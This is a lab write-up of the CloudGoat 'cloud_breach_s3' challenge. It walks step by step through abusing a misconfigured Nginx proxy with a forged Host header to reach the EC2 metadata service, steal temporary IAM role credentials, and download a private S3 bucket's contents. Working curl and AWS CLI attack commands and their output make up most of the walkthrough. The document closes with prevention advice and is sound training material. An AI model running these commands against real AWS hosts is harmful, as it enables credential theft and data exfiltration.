# Cloud Breach S3 – Terraform Scenario

## Solution

This lab demonstrates how a misconfigured Nginx reverse proxy can expose the Amazon EC2 Instance Metadata Service (IMDS). Because the EC2 instance was configured to use IMDSv1, the metadata service returned temporary IAM role credentials without requiring a session token. Those credentials were then used to access and download files from a private Amazon S3 bucket.

This challenge was completed only in the authorized AWS lab environment created by the provided Terraform configuration.

## Attack Path

```text
My computer
    ↓
Public EC2 IP
    ↓
Misconfigured Nginx reverse proxy
    ↓
EC2 Instance Metadata Service: 169.254.169.254
    ↓
Temporary EC2 IAM role credentials
    ↓
AWS CLI configured with temporary credentials
    ↓
Private S3 bucket
    ↓
Download FLAG.txt and the lab data files
```

---

## Lab Objective

The objective of this challenge was to access confidential files stored in a private S3 bucket by exploiting the vulnerable EC2 reverse proxy.

The final proof required by the assignment was a screenshot showing the successful download and display of:

```text
FLAG.txt
```

The vulnerable configuration included:

```text
Nginx reverse proxy accepted a request using Host: 169.254.169.254
EC2 metadata service allowed IMDSv1 requests
EC2 had an IAM role with S3 read permissions
Temporary IAM credentials could be retrieved through the proxy
The temporary credentials could access the private S3 bucket
```

The S3 bucket itself was private. The breach happened because valid IAM role credentials were obtained from the EC2 metadata service.

---

# a. Verified the Required Tools and AWS Identity

Before creating the lab environment, I verified that Terraform and the AWS CLI were installed.

## Commands Executed

```bash
terraform version
aws --version
aws sts get-caller-identity
```

## Important Result

```text
Terraform v1.15.4
AWS CLI installed successfully
AWS identity: user/myadmin
```

## Explanation

The `aws sts get-caller-identity` command confirmed that the terminal was authenticated to the correct AWS account before Terraform created any resources.

---

# b. Created the Local Terraform Variables File

I first retrieved my current public IP address.

## Command Executed

```bash
curl -s https://checkip.amazonaws.com
```

## Result

```text
91.234.xxx.xxx
```

I then created a local `terraform.tfvars` file with the following configuration:

```hcl
aws_region  = "us-east-1"
aws_profile = "default"

vpc_cidr           = "10.0.0.0/16"
public_subnet_cidr = "10.0.1.0/24"

allowed_cidr_blocks = ["91.234.xxx.xxx/32"]

ec2_instance_type = "t3.micro"

ssh_key_name = ""
enable_ssh   = false

# Intentionally vulnerable for the challenge
use_imdsv2 = false

enable_bucket_versioning = true
enable_logging            = false

difficulty = "easy"
```

## Explanation

The `/32` CIDR restricted access to the vulnerable EC2 web server so that only my public IP could connect to it.

The setting below intentionally enabled the vulnerable challenge configuration:

```hcl
use_imdsv2 = false
```

This caused the EC2 instance to allow IMDSv1 requests. SSH was disabled because it was not required for the challenge.

---

# c. Initialized and Validated Terraform

I initialized the Terraform working directory and validated the configuration.

## Commands Executed

```bash
terraform init
terraform fmt
terraform validate
```

## Results

```text
Terraform has been successfully initialized!
Success! The configuration is valid.
```

## Explanation

- `terraform init` downloaded the required AWS provider and prepared the working directory.
- `terraform fmt` formatted the Terraform files.
- `terraform validate` confirmed that the Terraform syntax and configuration were valid.

---

# d. Reviewed the Terraform Plan

I created and saved a Terraform execution plan.

## Command Executed

```bash
terraform plan -out=tfplan
```

## Result

```text
Plan: 17 to add, 0 to change, 0 to destroy.
```

The planned outputs also showed:

```text
imds_version = "IMDSv1 (Vulnerable)"
imds_vulnerable = true
open_to_internet = false
ssh_enabled = false
```

## Explanation

The plan confirmed that Terraform would create 17 AWS resources for the challenge. It also confirmed that IMDSv1 was enabled intentionally, the EC2 instance was restricted to my IP address, and SSH was disabled.

---

# e. Deployed the Vulnerable Lab Environment

After reviewing the saved plan, I applied it.

## Command Executed

```bash
terraform apply tfplan
```

## Result

```text
Apply complete! Resources: 17 added, 0 changed, 0 destroyed.
```

Terraform produced the following important values:

```text
scenario_name = "cloud-breach-s3-l8lt4bbu"
target_ec2_ip = "100.53.44.72"
imds_version = "IMDSv1 (Vulnerable)"
```

## Explanation

Terraform created the vulnerable environment, including:

```text
VPC and public subnet
Internet gateway and routing
Security group
EC2 instance running Nginx
EC2 instance profile and IAM role
Private S3 bucket
S3 objects containing simulated confidential data
S3 Public Access Block configuration
```

The role name and bucket name were marked as sensitive Terraform outputs, so they were discovered through the challenge rather than printed directly.

---

# f. Saved and Tested the Target EC2 IP

I saved the public EC2 IP in a shell variable.

## Commands Executed

```bash
TARGET=$(terraform output -raw target_ec2_ip)
echo "$TARGET"
```

## Output

```text
100.53.44.72
```

I then tested the web server.

```bash
curl -i "http://$TARGET/"
```

## Important Response

```text
HTTP/1.1 200 OK
Proxy Configuration Error
This server is configured to proxy requests to the EC2 metadata service.
The metadata service is available at 169.254.169.254
```

## Explanation

The response confirmed that Nginx was running and that the application was intentionally configured as a vulnerable reverse proxy. The page also provided a hint that the EC2 metadata service was available at:

```text
169.254.169.254
```

---

# g. Retrieved the EC2 IAM Role Name

I modified the HTTP `Host` header so that the reverse proxy forwarded the request to the EC2 metadata service.

## Commands Executed

```bash
ROLE=$(curl -s \
  "http://$TARGET/latest/meta-data/iam/security-credentials/" \
  -H 'Host: 169.254.169.254' | tr -d '\r\n')

echo "$ROLE"
```

## Output

```text
cloud-breach-s3-l8lt4bbu-banking-WAF-Role
```

## Explanation

The Nginx configuration accepted the metadata IP in the `Host` header and proxied the request to IMDS. The metadata endpoint returned the name of the IAM role attached to the EC2 instance.

This proved that the reverse proxy exposed the instance metadata service.

---

# h. Retrieved the Temporary IAM Role Credentials

After discovering the IAM role name, I requested the role credential endpoint.

## Command Executed

```bash
CREDS=$(curl -s \
  "http://$TARGET/latest/meta-data/iam/security-credentials/$ROLE" \
  -H 'Host: 169.254.169.254')
```

I verified that the credential fields were present without printing the secret values.

```bash
printf '%s' "$CREDS" | python3 -c '
import json
import sys

data = json.load(sys.stdin)
print("Code:", data.get("Code"))
print("Expiration:", data.get("Expiration"))
print("Access key received:", bool(data.get("AccessKeyId")))
print("Secret key received:", bool(data.get("SecretAccessKey")))
print("Session token received:", bool(data.get("Token")))
'
```

## Result

```text
Code: Success
Access key received: True
Secret key received: True
Session token received: True
```

## Explanation

The metadata service returned temporary AWS credentials containing:

```text
AccessKeyId
SecretAccessKey
Token
Expiration
```

The credentials were stored in the `CREDS` shell variable. I did not print the full JSON response or expose the secret values in screenshots.

---

# i. Configured a Separate AWS CLI Profile

I extracted the temporary credential values and configured a separate AWS CLI profile named `lab-stolen`.

## Commands Executed

```bash
ACCESS_KEY=$(printf '%s' "$CREDS" | python3 -c \
'import json,sys; print(json.load(sys.stdin)["AccessKeyId"])')

SECRET_KEY=$(printf '%s' "$CREDS" | python3 -c \
'import json,sys; print(json.load(sys.stdin)["SecretAccessKey"])')

SESSION_TOKEN=$(printf '%s' "$CREDS" | python3 -c \
'import json,sys; print(json.load(sys.stdin)["Token"])')
```

I configured the profile:

```bash
aws configure set aws_access_key_id "$ACCESS_KEY" --profile lab-stolen
aws configure set aws_secret_access_key "$SECRET_KEY" --profile lab-stolen
aws configure set aws_session_token "$SESSION_TOKEN" --profile lab-stolen
aws configure set region us-east-1 --profile lab-stolen
```

I then cleared the secret values from the shell variables:

```bash
unset ACCESS_KEY SECRET_KEY SESSION_TOKEN CREDS
```

## Explanation

Temporary credentials require three values:

```text
Access key ID
Secret access key
Session token
```

The session token was essential. When it was initially missing, AWS returned:

```text
InvalidClientTokenId
The security token included in the request is invalid.
```

After adding `aws_session_token` to the profile, the temporary credentials worked correctly.

---

# j. Verified the Compromised EC2 Role Identity

I verified the identity used by the `lab-stolen` profile.

## Command Executed

```bash
aws sts get-caller-identity --profile lab-stolen
```

## Important Output

```text
arn:aws:sts::<AWS_ACCOUNT_ID>:assumed-role/cloud-breach-s3-l8lt4bbu-banking-WAF-Role/<EC2_INSTANCE_ID>
```

## Explanation

The output confirmed that the AWS CLI was no longer using my normal administrative profile. It was using temporary credentials belonging to the IAM role attached to the EC2 instance.

This was the main credential-compromise step in the challenge.

---

# k. Discovered the Private S3 Bucket

I listed the S3 buckets visible to the compromised role.

## Command Executed

```bash
aws s3 ls --profile lab-stolen
```

## Output

```text
cloud-breach-s3-l8lt4bbu-cardholder-data
```

I saved the bucket name in a variable:

```bash
BUCKET="cloud-breach-s3-l8lt4bbu-cardholder-data"
```

## Explanation

The bucket was private, but the EC2 role had permission to access it. Therefore, the stolen temporary credentials provided authorized access even though public access to the bucket was blocked.

---

# l. Listed the Confidential S3 Objects

I listed the objects stored in the private bucket.

## Command Executed

```bash
aws s3 ls "s3://$BUCKET/" --profile lab-stolen
```

## Files Discovered

```text
FLAG.txt
cardholder_data_primary.csv
cardholder_data_secondary.csv
```

## Explanation

The S3 bucket contained simulated confidential cardholder data and the challenge completion flag.

---

# m. Downloaded the S3 Files

I created a local directory and downloaded all objects from the bucket.

## Commands Executed

```bash
mkdir -p downloaded-lab-data

aws s3 cp "s3://$BUCKET/" downloaded-lab-data/ \
  --recursive \
  --profile lab-stolen
```

## Result

```text
download: s3://cloud-breach-s3-l8lt4bbu-cardholder-data/FLAG.txt to downloaded-lab-data/FLAG.txt
download: s3://cloud-breach-s3-l8lt4bbu-cardholder-data/cardholder_data_primary.csv to downloaded-lab-data/cardholder_data_primary.csv
download: s3://cloud-breach-s3-l8lt4bbu-cardholder-data/cardholder_data_secondary.csv to downloaded-lab-data/cardholder_data_secondary.csv
```

## Explanation

This completed the S3 data-exfiltration portion of the challenge. The files were copied from the private S3 bucket to the local computer by using the compromised EC2 role credentials.

---

# n. Displayed the Challenge Flag

I displayed the contents of the downloaded flag file.

## Command Executed

```bash
cat downloaded-lab-data/FLAG.txt
```

## Final Output

```text
Congratulations! You have successfully completed the cloud_breach_s3 scenario!

You exploited:
1. A misconfigured reverse proxy server
2. Instance Metadata Service (IMDS) exposure
3. Overly permissive IAM role attached to EC2

Flag: CLOUDGOAT{l8lt4bbu_BREACH_COMPLETE}
```

## Explanation

This was the final proof that the challenge was completed successfully. I captured the required screenshot at this stage because the terminal showed:

```text
Successful S3 file download
FLAG.txt contents
Challenge completion message
Final CLOUDGOAT flag
```

---

# Security Analysis

## Why the Private S3 Bucket Was Still Compromised

The S3 bucket was not public. S3 Public Access Block could still be enabled and the attack would remain successful because the attacker obtained valid AWS credentials.

The access path was:

```text
Public request to EC2
→ vulnerable reverse proxy
→ IMDSv1 metadata endpoint
→ temporary IAM role credentials
→ authorized S3 API requests
→ private bucket data downloaded
```

This demonstrates that keeping an S3 bucket private is necessary but not sufficient. The credentials and permissions of trusted AWS resources must also be protected.

## Main Vulnerabilities

### 1. Misconfigured Reverse Proxy

Nginx accepted a user-controlled `Host` header and used it to proxy requests to the metadata IP.

### 2. IMDSv1 Enabled

IMDSv1 did not require a session token. A single proxied GET request was sufficient to retrieve metadata and temporary IAM credentials.

### 3. Overly Permissive IAM Role

The EC2 role had enough permission to list S3 buckets and retrieve objects from the confidential bucket.

### 4. Internet-Reachable Application

Although access was limited to my IP for the lab, the reverse proxy was reachable through the public EC2 IP. In a real environment, broad internet access would increase the risk.

---

# Reflection

## What Was My Approach?

My approach was to follow the attack path one stage at a time and verify each result before moving forward.

I first deployed the Terraform environment and confirmed that the EC2 instance was configured with IMDSv1. I then tested the public IP and found the Nginx hint explaining that requests could be proxied to `169.254.169.254`.

Next, I changed the `Host` header and queried the IAM security credential path. This returned the EC2 role name. I used the role name to request the temporary AWS credentials, configured them in a separate AWS CLI profile, and verified the new assumed-role identity.

Finally, I used the compromised role to discover the private S3 bucket, list its objects, download the files, and display `FLAG.txt`.

The overall approach was:

```text
Deploy environment
→ test public EC2 endpoint
→ exploit Host header proxying
→ query IMDS
→ retrieve temporary role credentials
→ configure AWS CLI profile
→ verify assumed-role identity
→ discover private S3 bucket
→ download files
→ display FLAG.txt
```

---

## What Was the Biggest Challenge?

The biggest challenge was understanding that the S3 bucket did not need to be public for the breach to succeed.

At first, it may appear that S3 Public Access Block should prevent the download. However, the attacker was not using anonymous public access. The attacker obtained valid temporary credentials from the EC2 IAM role. AWS therefore treated the S3 requests as authenticated role requests.

Another challenge was configuring temporary AWS credentials correctly. Unlike long-term IAM user credentials, temporary role credentials require a session token in addition to the access key and secret key.

---

## How Did I Overcome the Challenge?

I verified each stage with a separate command instead of assuming that the previous step worked.

Examples included:

```bash
echo "$ROLE"
aws sts get-caller-identity --profile lab-stolen
aws s3 ls --profile lab-stolen
aws s3 ls "s3://$BUCKET/" --profile lab-stolen
```

When AWS returned `InvalidClientTokenId`, I reviewed the profile configuration and discovered that the temporary session token had not been added. I retrieved the token again and configured it with:

```bash
aws configure set aws_session_token "$SESSION_TOKEN" --profile lab-stolen
```

After that, `aws sts get-caller-identity` successfully showed the assumed EC2 role.

---

## What Led to the Breakthrough?

The first breakthrough was the Nginx hint:

```text
The metadata service is available at 169.254.169.254
```

The second breakthrough was sending the following header:

```text
Host: 169.254.169.254
```

This caused Nginx to proxy the request to the metadata service and return the IAM role name.

The final breakthrough was realizing that the returned metadata credentials were valid AWS credentials. Once all three temporary credential fields were configured, the EC2 role could access the private S3 bucket.

---

## On the Blue Side, How Can This Be Prevented?

### 1. Require IMDSv2

Configure EC2 metadata options with:

```hcl
metadata_options {
  http_tokens = "required"
}
```

IMDSv2 requires a session token, making simple one-request metadata exploitation much more difficult.

### 2. Secure the Reverse Proxy

Nginx should use a strict list of accepted hostnames and reject unexpected `Host` headers. It should never allow user input to select internal destinations such as `169.254.169.254`.

### 3. Apply Least Privilege to the EC2 Role

The EC2 role should receive only the exact S3 permissions required by the application. Broad actions such as listing all buckets should be avoided.

A restricted policy should reference only the required bucket and object path.

### 4. Restrict Network Exposure

Public access to the EC2 application should be limited through security groups, load balancers, web application firewalls, authentication, or private networking.

### 5. Use VPC Endpoints and Endpoint Policies

An S3 VPC endpoint can keep S3 traffic inside the AWS network. Endpoint policies can further restrict which buckets and actions are allowed.

### 6. Monitor Metadata and Credential Abuse

CloudTrail, GuardDuty, VPC Flow Logs, application logs, and security alerts should be used to detect unusual role activity, unexpected S3 access, and suspicious requests involving metadata endpoints.

### 7. Protect Sensitive S3 Data

Use:

```text
S3 Block Public Access
Least-privilege bucket policies
Server-side encryption
Versioning
Object Lock where required
Access logging and monitoring
Lifecycle and retention policies
```

---

# Conclusion

This challenge demonstrated that a private S3 bucket can still be breached when an attacker obtains valid IAM credentials from another AWS resource.

The vulnerable Nginx reverse proxy allowed requests to reach the EC2 metadata service. Because IMDSv1 was enabled, the metadata endpoint returned temporary credentials for the IAM role attached to the EC2 instance. The role had permission to access the confidential S3 bucket, so the credentials were used to list and download the bucket objects.

The final result was verified by displaying:

```text
FLAG.txt
CLOUDGOAT{l8lt4bbu_BREACH_COMPLETE}
```

The main security lesson is that cloud security requires defence in depth. S3 privacy settings alone cannot protect data if trusted compute resources expose credentials or receive excessive IAM permissions.

---

# Cleanup

After collecting the required evidence, the lab resources should be removed to avoid unnecessary AWS costs and to ensure that the intentionally vulnerable server is not left running.

## Destroy the Terraform Resources

```bash
terraform destroy
```

When Terraform asks for confirmation, enter:

```text
yes
```

Expected result:

```text
Destroy complete!
```

## Verify Terraform State

```bash
terraform state list
```

If cleanup is successful, no Terraform-managed resources should be listed.

## Remove the Temporary AWS CLI Profile

The temporary metadata credentials expire automatically, but the local profile entries should also be removed from:

```text
~/.aws/credentials
~/.aws/config
```

Only the `lab-stolen` profile should be removed. The normal `default` AWS profile should remain unchanged.
